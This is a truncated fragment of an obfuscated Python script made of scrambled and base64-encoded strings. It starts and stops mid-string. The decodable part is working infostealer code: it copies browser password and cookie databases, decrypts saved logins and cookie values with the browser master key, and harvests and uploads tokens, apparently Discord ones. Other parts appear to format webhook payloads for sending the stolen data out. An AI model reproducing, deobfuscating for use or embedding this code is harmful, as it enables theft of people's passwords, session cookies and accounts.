'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'\\ngod = 'xvYmFsIFRva2VucwogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBwcmludCh0b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUb2tlbnMgKz0gdG9rZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkKClBhc3N3ID0gW10KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgUGFzc3csIFBhc3N3Q291bnQKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Mb2dpbiBEYXRhIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiIKCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOiAKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpCiAgICAgICAgICAgIFBhc3N3LmFwcGVuZChmIlVSMToge3Jvd1swXX0gfCBVNTNSTjRNMzoge3Jvd1sxXX0gfCBQNDU1VzBSRDoge0RlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpfSIpCiAgICAgICAgICAgIFBhc3N3Q291bnQgKz0gMQogICAgd3JpdGVmb3JmaWxlKFBhc3N3LCAncGFzc3cnKQoKQ29va2llcyA9IFtdICAgIApkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6CiAgICBnbG9iYWwgQ29va2llcywgQ29va2lDb3VudAogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KICAgIAogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KICAgIAogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICAKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gc3FsX2Nvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikKICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIAogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkKCiAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICBDb29raWVzLmFwcGVuZChmIkgwNTcgSzNZOiB7cm93WzBdfSB8IE40TTM6IHtyb3dbMV19IHwgVjQxVTM6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICBDb29raUNvdW50ICs9IDEKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnY29vaycpCgpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGYie3BhdGh9L0xvY2FsIFN0YXRlIik6IHJldHVybgoKICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSIKICAgIHdpdG